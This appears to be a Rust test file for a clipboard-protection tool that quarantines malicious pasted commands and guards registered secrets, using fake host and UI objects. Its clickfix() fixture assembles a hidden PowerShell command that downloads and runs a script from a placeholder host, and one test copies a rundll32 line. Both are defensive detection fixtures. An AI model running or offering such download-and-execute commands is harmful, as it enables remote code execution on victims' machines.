//! Worker tests with a fake host and in-memory persistence. All secrets are
//! fake; the malicious command is assembled from parts at run time.

use std::sync::Mutex;
use std::sync::mpsc::{Receiver, sync_channel};

use paste_warden_core::policy::windows::windows_rules;
use paste_warden_platform::clipboard::EmptyReason;
use paste_warden_platform::gate::PasteGate;
use paste_warden_platform::host::HostError;

use super::*;
use crate::persist::MemoryPersistence;

// ---------------------------------------------------------------------------
// Fakes

#[derive(Default)]
struct FakeState {
    clipboard: Option<String>,
    seq: u32,
    cleared: u32,
    writes: Vec<String>,
    pastes: Vec<WindowId>,
    restores: u32,
    intercept: Vec<bool>,
    checks: u32,
    reinstalls: u32,
    status: ProtectionStatus,
    probe_reply: Option<HookCheck>,
}

struct FakeHost {
    gate: Arc<PasteGate>,
    s: Mutex<FakeState>,
}

impl FakeHost {
    fn new() -> Arc<FakeHost> {
        Arc::new(FakeHost {
            gate: Arc::new(PasteGate::new()),
            s: Mutex::new(FakeState::default()),
        })
    }

    fn st(&self) -> std::sync::MutexGuard<'_, FakeState> {
        self.s.lock().unwrap()
    }

    /// Puts `text` on the clipboard and returns the event the monitor sends.
    fn copy(&self, text: &str) -> HostEvent {
        let mut s = self.st();
        s.seq += 1;
        s.clipboard = Some(text.to_owned());
        HostEvent::Clip(ClipEvent::Text(ClipText {
            sequence: s.seq,
            text: Zeroizing::new(text.to_owned()),
            truncated: false,
            source_url: None,
            owner_process: None,
            self_write: false,
        }))
    }
}

impl Host for FakeHost {
    fn gate(&self) -> &Arc<PasteGate> {
        &self.gate
    }
    fn status(&self) -> ProtectionStatus {
        self.st().status
    }
    fn write_text(&self, text: &str) -> Result<u32, HostError> {
        let mut s = self.st();
        s.seq += 1;
        s.clipboard = Some(text.to_owned());
        s.writes.push(text.to_owned());
        Ok(s.seq)
    }
    fn clear(&self) -> Result<u32, HostError> {
        let mut s = self.st();
        s.seq += 1;
        s.clipboard = None;
        s.cleared += 1;
        Ok(s.seq)
    }
    fn read_full(&self) -> Option<Zeroizing<String>> {
        self.st().clipboard.clone().map(Zeroizing::new)
    }
    fn snapshot(&self) -> Result<HostSnapshot, HostError> {
        Ok(HostSnapshot(Box::new(self.st().clipboard.clone())))
    }
    fn restore(&self, snap: HostSnapshot) -> Result<u32, HostError> {
        let old = snap
            .0
            .downcast::<Option<String>>()
            .map_err(|_| HostError::Clipboard)?;
        let mut s = self.st();
        s.seq += 1;
        s.clipboard = *old;
        s.restores += 1;
        Ok(s.seq)
    }
    fn paste_into(&self, target: WindowId) -> Result<(), HostError> {
        self.st().pastes.push(target);
        Ok(())
    }
    fn idle_ms(&self) -> Option<u64> {
        Some(0)
    }
    fn set_intercept(&self, enabled: bool) -> Result<(), HostError> {
        self.st().intercept.push(enabled);
        Ok(())
    }
    fn check_hook(&self) -> HookCheck {
        let mut s = self.st();
        s.checks += 1;
        s.probe_reply.unwrap_or(HookCheck::ProbeSent)
    }
    fn reinstall_hook(&self) -> Result<(), HostError> {
        self.st().reinstalls += 1;
        Ok(())
    }
}

#[derive(Default)]
struct Recorded {
    statuses: Vec<ProtectionStatus>,
    settings: Vec<SettingsPayload>,
    notices: Vec<Notice>,
    confirms: Vec<ConfirmPayload>,
    closes: u32,
    restore_available: Vec<bool>,
}

#[derive(Clone, Default)]
struct FakeUi(Arc<Mutex<Recorded>>);

impl FakeUi {
    fn r(&self) -> std::sync::MutexGuard<'_, Recorded> {
        self.0.lock().unwrap()
    }
    fn titles(&self) -> Vec<String> {
        self.r()
            .notices
            .iter()
            .map(|n| match &n.title {
                Line::Msg(m) | Line::Nested(m, _) => m.id.to_string(),
                Line::Masked(s) => s.clone(),
            })
            .collect()
    }
}

impl UiSink for FakeUi {
    fn status_changed(&mut self, s: &ProtectionStatus) {
        self.r().statuses.push(*s);
    }
    fn settings_changed(&mut self, s: &SettingsPayload) {
        self.r().settings.push(s.clone());
    }
    fn notify(&mut self, n: &Notice) {
        self.r().notices.push(n.clone());
    }
    fn open_confirm(&mut self, p: &ConfirmPayload) {
        self.r().confirms.push(p.clone());
    }
    fn close_confirm(&mut self) {
        self.r().closes += 1;
    }
    fn restore_available(&mut self, a: bool) {
        self.r().restore_available.push(a);
    }
}

struct Rig {
    host: Arc<FakeHost>,
    ui: FakeUi,
    w: Worker,
    now: u64,
}

fn rig_with(f: impl FnOnce(&mut MemoryPersistence)) -> Rig {
    let host = FakeHost::new();
    let ui = FakeUi::default();
    let mut p = MemoryPersistence::new([7u8; 32]);
    p.settings.last_version = Some("test".into());
    f(&mut p);
    let boot = Boot::load(&mut p, "test");
    let cfg = WorkerConfig {
        rules: windows_rules(),
        platform: Platform::Windows,
        own_ids: vec!["paste-warden-desktop".into()],
        system_locale: "en",
    };
    let w = Worker::new(
        boot,
        host.clone(),
        Box::new(ui.clone()),
        Box::new(p),
        None,
        cfg,
        0,
    );
    Rig {
        host,
        ui,
        w,
        now: 0,
    }
}

fn rig() -> Rig {
    rig_with(|_| {})
}

impl Rig {
    fn at(&mut self, ms: u64) -> &mut Self {
        self.now = ms;
        self.w.tick(ms);
        self
    }
    fn ev(&mut self, ev: HostEvent) {
        self.w.handle(WorkerMsg::Host(ev), self.now);
    }
    fn cmd<T>(&mut self, make: impl FnOnce(Reply<T>) -> UiCommand) -> T {
        let (tx, rx): (_, Receiver<T>) = sync_channel(1);
        self.w.handle(WorkerMsg::Ui(make(tx)), self.now);
        rx.try_recv().expect("reply")
    }
    fn register(&mut self, secret: &str) -> CmdResult<RegisteredId> {
        let s = secret.to_owned();
        self.cmd(|reply| UiCommand::RegisterSecret {
            secret: Zeroizing::new(s.clone()),
            confirm: Zeroizing::new(s),
            label: "bank".into(),
            now_wall_ms: 1_700_000_000_000,
            reply,
        })
    }
}

fn clickfix() -> String {
    [
        "power",
        "shell -w hidden -c \"i",
        "ex(i",
        "wr 'https://example.invalid/a.ps1')\"",
    ]
    .concat()
}

/// Fake 12-char "secret" (not a real credential of any kind).
const FAKE_SECRET: &str = "zq-fake-77xy";

// ---------------------------------------------------------------------------
// Tests

#[test]
fn quarantine_clears_and_notifies_once_then_restores() {
    let mut r = rig();
    let ev = r.host.copy(&clickfix());
    r.ev(ev);
    assert_eq!(r.host.st().cleared, 1);
    assert_eq!(r.ui.titles(), vec!["ui-desktop-toast-quarantine-title"]);
    assert_eq!(r.ui.r().restore_available.last(), Some(&true));
    // Our own clearing arrives as an empty change: no second notification.
    let seq = r.host.st().seq;
    r.ev(HostEvent::Clip(ClipEvent::Empty {
        sequence: seq,
        reason: EmptyReason::NoText,
    }));
    r.at(10_000);
    assert_eq!(r.ui.r().notices.len(), 1);
    assert_eq!(r.host.gate().verdict(), (seq, Decision::Allow));

    // Restore (tray): written back, trusted, not cleared again.
    let res = r.cmd(UiCommand::Restore);
    assert!(res.is_ok());
    assert_eq!(r.host.st().writes, vec![clickfix()]);
    let seq = r.host.st().seq;
    r.ev(HostEvent::Clip(ClipEvent::Text(ClipText {
        sequence: seq,
        text: Zeroizing::new(clickfix()),
        truncated: false,
        source_url: None,
        owner_process: None,
        self_write: true,
    })));
    assert_eq!(r.host.st().cleared, 1, "restored content is trusted");
    assert_eq!(r.ui.r().restore_available.last(), Some(&false));
    assert!(
        r.cmd(UiCommand::Restore).is_err(),
        "nothing left to restore"
    );
}

#[test]
fn registered_secret_publishes_intercept_and_confirm_flow() {
    let mut r = rig();
    assert_eq!(
        r.w.compute_status().intercept,
        Capability::Unavailable(Reason::DisabledInSettings),
        "no registered secret yet"
    );
    let id = r.register(FAKE_SECRET).expect("registered").id;
    assert_eq!(r.host.st().intercept.last(), Some(&true), "hook installed");
    assert!(r.w.compute_status().intercept.is_active());

    let ev = r.host.copy(&format!("my password is {FAKE_SECRET} ok"));
    r.ev(ev);
    let seq = r.host.st().seq;
    assert_eq!(r.host.gate().verdict(), (seq, Decision::Intercept));
    assert_eq!(r.ui.titles(), vec!["ui-desktop-toast-secret-title"]);

    // Ctrl+V swallowed → confirmation with masked preview only.
    r.ev(HostEvent::PasteSwallowed {
        target: 42,
        reason: SwallowReason::Intercept,
    });
    let c = r.ui.r().confirms.last().cloned().expect("confirm opened");
    assert_eq!(c.kinds, vec!["ui-desktop-kind-registered".to_owned()]);
    assert!(!c.masked_preview.contains(FAKE_SECRET));
    assert!(c.masked_preview.contains(REGISTERED_MASK));
    assert_eq!(r.host.gate().pending_target(), 42);

    // Masked: write masked text, paste, switch back after 600 ms.
    let res = r.cmd(|reply| UiCommand::PasteChoice(PasteChoice::Masked, reply));
    assert!(res.is_ok());
    assert_eq!(r.host.gate().pending_target(), 0);
    assert_eq!(r.host.st().pastes, vec![42]);
    assert!(!r.host.st().writes[0].contains(FAKE_SECRET));
    r.at(MASKED_PASTE_RESTORE_DELAY_MS - 1);
    assert_eq!(r.host.st().restores, 0);
    r.at(MASKED_PASTE_RESTORE_DELAY_MS);
    assert_eq!(r.host.st().restores, 1);
    assert!(
        r.host
            .st()
            .clipboard
            .as_deref()
            .unwrap()
            .contains(FAKE_SECRET)
    );

    // Removing the only secret turns interception off.
    assert!(r.cmd(|reply| UiCommand::RemoveSecret(id, reply)).is_ok());
    assert_eq!(r.host.st().intercept.last(), Some(&false));
    assert!(r.cmd(UiCommand::ListSecrets).unwrap().is_empty());
}

#[test]
fn masked_paste_does_not_switch_back_over_a_newer_copy() {
    let mut r = rig();
    r.register(FAKE_SECRET).unwrap();
    let ev = r.host.copy(FAKE_SECRET);
    r.ev(ev);
    r.ev(HostEvent::PasteSwallowed {
        target: 42,
        reason: SwallowReason::Intercept,
    });
    assert!(
        r.cmd(|reply| UiCommand::PasteChoice(PasteChoice::Masked, reply))
            .is_ok()
    );
    // The user copies something else before the switch back is due.
    r.at(MASKED_PASTE_RESTORE_DELAY_MS / 2);
    let ev = r.host.copy("copied meanwhile");
    r.ev(ev);
    r.at(MASKED_PASTE_RESTORE_DELAY_MS * 2);
    assert_eq!(r.host.st().restores, 0);
    assert_eq!(r.host.st().clipboard.as_deref(), Some("copied meanwhile"));
}

#[test]
fn confirm_times_out_as_cancel() {
    let mut r = rig();
    r.register(FAKE_SECRET).unwrap();
    let ev = r.host.copy(FAKE_SECRET);
    r.ev(ev);
    r.ev(HostEvent::PasteSwallowed {
        target: 5,
        reason: SwallowReason::Intercept,
    });
    r.at(PENDING_TIMEOUT_MS);
    assert_eq!(r.ui.r().closes, 1);
    assert!(r.host.st().pastes.is_empty());
    assert_eq!(r.host.gate().pending_target(), 0);
    let res = r.cmd(|reply| UiCommand::PasteChoice(PasteChoice::Original, reply));
    assert_eq!(
        res.unwrap_err().message_id,
        "ui-desktop-error-no-pending-paste"
    );
}

#[test]
fn stale_paste_is_resent_after_analysis_or_dropped_after_timeout() {
    let mut r = rig();
    r.ev(HostEvent::PasteSwallowed {
        target: 9,
        reason: SwallowReason::Pending,
    });
    let ev = r.host.copy("hello world");
    r.ev(ev);
    assert_eq!(r.host.st().pastes, vec![9]);

    r.ev(HostEvent::PasteSwallowed {
        target: 9,
        reason: SwallowReason::Pending,
    });
    r.at(PENDING_ANALYSIS_TIMEOUT_MS);
    assert_eq!(r.host.st().pastes, vec![9], "fail closed: no re-send");
    assert_eq!(r.ui.titles(), vec!["ui-desktop-toast-not-pasted-title"]);
}

#[test]
fn registration_errors_name_the_field_and_never_echo_input() {
    let mut r = rig();
    let e = r
        .cmd(|reply| UiCommand::RegisterSecret {
            secret: Zeroizing::new(FAKE_SECRET.into()),
            confirm: Zeroizing::new("different-1".into()),
            label: String::new(),
            now_wall_ms: 0,
            reply,
        })
        .unwrap_err();
    assert_eq!(e.field, Some("confirm"));
    let json = serde_json::to_string(&e).unwrap();
    assert!(!json.contains(FAKE_SECRET) && !json.contains("different-1"));

    let e = r
        .cmd(|reply| UiCommand::RegisterSecret {
            secret: Zeroizing::new(FAKE_SECRET.into()),
            confirm: Zeroizing::new(FAKE_SECRET.into()),
            label: "x".repeat(MAX_LABEL_LENGTH + 1),
            now_wall_ms: 0,
            reply,
        })
        .unwrap_err();
    assert_eq!(e.field, Some("label"));

    r.register(FAKE_SECRET).unwrap();
    let e = r.register(FAKE_SECRET).unwrap_err();
    assert_eq!(e.message_id, "registered-already-registered");
    let list = r.cmd(UiCommand::ListSecrets).unwrap();
    assert_eq!(list.len(), 1);
    assert_eq!(list[0].label, "bank");
    assert_eq!(list[0].length, FAKE_SECRET.chars().count());
}

#[test]
fn status_overlays_probe_elevated_and_settings() {
    let mut r = rig();
    r.register(FAKE_SECRET).unwrap();
    assert!(r.w.compute_status().intercept.is_active());

    // Elevated foreground: degraded, no notification without a secret.
    r.ev(HostEvent::Foreground(ForegroundInfo {
        window: 3,
        root: 3,
        elevated: true,
        ..Default::default()
    }));
    assert_eq!(
        r.ui.r().statuses.last().unwrap().intercept,
        Capability::Degraded(Reason::ElevatedForeground)
    );
    assert!(r.ui.r().notices.is_empty());
    // Secret on the clipboard while elevated: one notice per (window, seq).
    let ev = r.host.copy(FAKE_SECRET);
    r.ev(ev);
    r.at(5_000);
    r.ev(HostEvent::Foreground(ForegroundInfo {
        window: 4,
        root: 4,
        ..Default::default()
    }));
    r.ev(HostEvent::Foreground(ForegroundInfo {
        window: 3,
        root: 3,
        elevated: true,
        ..Default::default()
    }));
    r.at(10_000);
    let elevated =
        r.ui.titles()
            .iter()
            .filter(|t| *t == "ui-desktop-toast-elevated-title")
            .count();
    assert_eq!(elevated, 1);

    // Back to a normal window; the probe fails twice → HookLost.
    r.ev(HostEvent::Foreground(ForegroundInfo {
        window: 4,
        root: 4,
        ..Default::default()
    }));
    assert!(r.w.compute_status().intercept.is_active());
    // Probe at 30 s, missed at 31 s (reinstall); again at 61 s, missed at 62 s.
    r.at(30_000);
    r.at(31_000);
    r.at(61_000);
    r.at(62_000);
    assert_eq!(r.host.st().reinstalls, 2);
    assert_eq!(
        r.ui.r().statuses.last().unwrap().intercept,
        Capability::Degraded(Reason::HookLost)
    );
    assert_eq!(
        r.ui.r().statuses.last().unwrap().tray_state(),
        paste_warden_platform::status::TrayState::Degraded
    );
    // The next answered probe clears it.
    r.at(92_000);
    r.ev(HostEvent::ProbeAnswered);
    assert!(r.ui.r().statuses.last().unwrap().intercept.is_active());

    // Host-reported problems pass through.
    r.host.st().status.watch = Capability::Unavailable(Reason::NoDataControl);
    r.at(93_000);
    assert_eq!(
        r.ui.r().statuses.last().unwrap().watch,
        Capability::Unavailable(Reason::NoDataControl)
    );
}

#[test]
fn probe_pauses_while_locked() {
    let mut r = rig();
    r.register(FAKE_SECRET).unwrap();
    r.ev(HostEvent::SessionLocked(true));
    for t in (30_000..=300_000).step_by(1_000) {
        r.at(t);
    }
    assert_eq!(r.host.st().checks, 0);
    assert!(r.w.compute_status().intercept.is_active());
}

#[test]
fn entry_warning_once_per_window_and_generation() {
    let mut r = rig();
    let ev = r.host.copy(&clickfix());
    r.ev(ev);
    let run = || {
        HostEvent::Foreground(ForegroundInfo {
            window: 77,
            root: 77,
            class: Some("#32770".into()),
            title: Some("Run".into()),
            process: Some("explorer".into()),
            elevated: false,
        })
    };
    r.at(10_000);
    r.ev(run());
    r.at(20_000);
    r.ev(run());
    r.at(30_000);
    let titles = r.ui.titles();
    assert_eq!(
        titles,
        vec!["ui-desktop-toast-quarantine-title", "entry-malicious-title"]
    );
}

#[test]
fn settings_commands_validate_and_emit() {
    let mut r = rig();
    assert!(r.cmd(|x| UiCommand::SetLocale(LocalePref::ZhTw, x)).is_ok());
    assert!(r.cmd(|x| UiCommand::SetTheme(ThemePref::Dark, x)).is_ok());
    let s = r.cmd(UiCommand::GetSettings);
    assert_eq!((s.locale, s.theme), ("zh-TW", "dark"));
    assert!(!s.version_changed);

    assert!(
        r.cmd(|x| UiCommand::AllowlistAdd(" C:\\Tools\\KeePass.exe ".into(), x))
            .is_ok()
    );
    let e = r
        .cmd(|x| UiCommand::AllowlistAdd("keepass".into(), x))
        .unwrap_err();
    assert_eq!(e.message_id, "ui-desktop-error-allowlist-duplicate");
    let e = r
        .cmd(|x| UiCommand::AllowlistAdd("   ".into(), x))
        .unwrap_err();
    assert_eq!(e.message_id, "ui-desktop-error-allowlist-empty");
    let e = r
        .cmd(|x| UiCommand::AllowlistAdd("a".repeat(MAX_APP_NAME_LENGTH + 1), x))
        .unwrap_err();
    assert_eq!(e.message_id, "ui-desktop-error-allowlist-too-long");
    assert_eq!(
        r.cmd(UiCommand::GetSettings).paste_guard.allowlist,
        vec!["KeePass".to_owned()]
    );
    assert!(
        r.cmd(|x| UiCommand::AllowlistRemove("keepass".into(), x))
            .is_ok()
    );
    assert!(
        r.cmd(UiCommand::GetSettings)
            .paste_guard
            .allowlist
            .is_empty()
    );

    assert!(
        r.cmd(|reply| UiCommand::SetPasteGuard {
            registered: false,
            detected: true,
            reply
        })
        .is_ok()
    );
    assert_eq!(r.host.st().intercept.last(), Some(&true));
    let last = r.ui.r().settings.last().cloned().unwrap();
    assert!(last.paste_guard.detected && !last.paste_guard.registered);
    assert!(r.cmd(UiCommand::CompleteOnboarding).is_ok());
    assert!(r.cmd(UiCommand::GetSettings).onboarding_done);
}

#[test]
fn version_change_is_reported_once() {
    let r = rig_with(|p| p.settings.last_version = Some("0.0.1".into()));
    assert!(r.ui.r().settings[0].version_changed);
}

#[test]
fn failed_save_keeps_old_settings() {
    let mut r = rig_with(|p| p.fail_saves = true);
    let e = r
        .cmd(|x| UiCommand::SetTheme(ThemePref::Dark, x))
        .unwrap_err();
    assert_eq!(e.message_id, "ui-desktop-error-save-failed");
    assert_eq!(r.cmd(UiCommand::GetSettings).theme, "system");
    assert!(r.register(FAKE_SECRET).is_err());
    assert!(r.cmd(UiCommand::ListSecrets).unwrap().is_empty());
}

#[test]
fn shutdown_removes_the_hook() {
    let mut r = rig();
    r.register(FAKE_SECRET).unwrap();
    let (tx, _rx) = sync_channel(1);
    assert!(!r.w.handle(WorkerMsg::Ui(UiCommand::Shutdown(tx)), 0));
    assert_eq!(r.host.st().intercept.last(), Some(&false));
}

#[test]
fn notification_throttle_holds_a_burst() {
    let mut r = rig();
    for i in 0..5 {
        let ev = r.host.copy(&format!("cmd {i}: rundll32 x.dll,Entry"));
        r.ev(ev);
    }
    // Whatever the verdicts, at most one notice shows before the interval.
    assert!(r.ui.r().notices.len() <= 1);
}

#[test]
fn platform_limit_wins_over_settings() {
    let mut r = rig();
    r.host.st().status.intercept = Capability::Unavailable(Reason::WaylandNoIntercept);
    r.at(1_000);
    let s = r.w.compute_status();
    assert_eq!(
        s.intercept,
        Capability::Unavailable(Reason::WaylandNoIntercept)
    );
    assert_eq!(
        s.tray_state(),
        paste_warden_platform::status::TrayState::Degraded
    );
    // Turned on in settings: still the platform limit.
    r.register(FAKE_SECRET).unwrap();
    assert_eq!(
        r.w.compute_status().intercept,
        Capability::Unavailable(Reason::WaylandNoIntercept)
    );
}

#[test]
fn status_changed_rereads_the_host() {
    let mut r = rig();
    r.register(FAKE_SECRET).unwrap();
    let ev = r.host.copy(FAKE_SECRET);
    r.ev(ev);
    // Past the notification throttle's interval for the secret notice.
    r.at(10_000);
    let before = r.ui.r().statuses.len();
    r.host.st().status.intercept = Capability::Degraded(Reason::SecureInput);
    r.ev(HostEvent::StatusChanged);
    assert_eq!(r.ui.r().statuses.len(), before + 1);
    assert_eq!(
        r.ui.r().statuses.last().unwrap().intercept,
        Capability::Degraded(Reason::SecureInput)
    );
    // Secure Input with a secret on the clipboard: told once.
    r.ev(HostEvent::StatusChanged);
    let n =
        r.ui.titles()
            .iter()
            .filter(|t| *t == "ui-desktop-toast-secure-input-title")
            .count();
    assert_eq!(n, 1);
}

#[test]
fn key_missing_is_reported_and_forget_recovers() {
    let mut r = rig_with(|p| p.registered_error = Some(PersistError::KeyMissing));
    assert_eq!(
        r.ui.titles(),
        vec!["ui-desktop-toast-settings-problem-title"]
    );
    let e = r.cmd(UiCommand::ListSecrets).unwrap_err();
    assert_eq!(e.message_id, "store-error-key-missing");
    assert_eq!(
        r.register(FAKE_SECRET).unwrap_err().message_id,
        "store-error-key-missing"
    );

    assert!(r.cmd(UiCommand::ForgetSecrets).is_ok());
    assert!(r.cmd(UiCommand::ListSecrets).unwrap().is_empty());
    r.register(FAKE_SECRET).unwrap();
    assert_eq!(r.cmd(UiCommand::ListSecrets).unwrap().len(), 1);
    // Forgetting also works with a healthy store.
    assert!(r.cmd(UiCommand::ForgetSecrets).is_ok());
    assert!(r.cmd(UiCommand::ListSecrets).unwrap().is_empty());
}

#[test]
fn legacy_cleanup_notice_shows_once_at_start() {
    let host = FakeHost::new();
    let ui = FakeUi::default();
    let mut p = MemoryPersistence::new([7u8; 32]);
    p.settings.last_version = Some("test".into());
    let mut boot = Boot::load(&mut p, "test");
    boot.legacy_cleaned = true;
    let cfg = WorkerConfig {
        rules: windows_rules(),
        platform: Platform::Windows,
        own_ids: vec![],
        system_locale: "en",
    };
    let _w = Worker::new(boot, host, Box::new(ui.clone()), Box::new(p), None, cfg, 0);
    assert_eq!(ui.titles(), vec!["ui-desktop-toast-legacy-removed-title"]);
}

#[test]
fn source_falls_back_to_the_foreground_before_the_change() {
    let mut r = rig();
    let fg = |w: i64, p: &str| {
        HostEvent::Foreground(ForegroundInfo {
            window: w,
            root: w,
            process: Some(p.into()),
            ..Default::default()
        })
    };
    r.at(1_000);
    r.ev(fg(1, "chrome"));
    r.at(10_000);
    let t = ClipText {
        sequence: 1,
        text: Zeroizing::new("x".into()),
        truncated: false,
        source_url: None,
        owner_process: None,
        self_write: false,
    };
    let app = |r: &Rig, t: &ClipText| r.w.context(t, r.now).source.unwrap().app_id;
    assert_eq!(app(&r, &t).as_deref(), Some("chrome"));
    // Switched away just before the event: the copy happened in chrome.
    r.ev(fg(2, "terminal"));
    r.now += FOREGROUND_SETTLE_MS - 1;
    assert_eq!(app(&r, &t).as_deref(), Some("chrome"));
    r.now += 1;
    assert_eq!(app(&r, &t).as_deref(), Some("terminal"));
    // The clipboard's own owner wins.
    let owned = ClipText {
        owner_process: Some("keepass".into()),
        ..t
    };
    assert_eq!(app(&r, &owned).as_deref(), Some("keepass"));
}
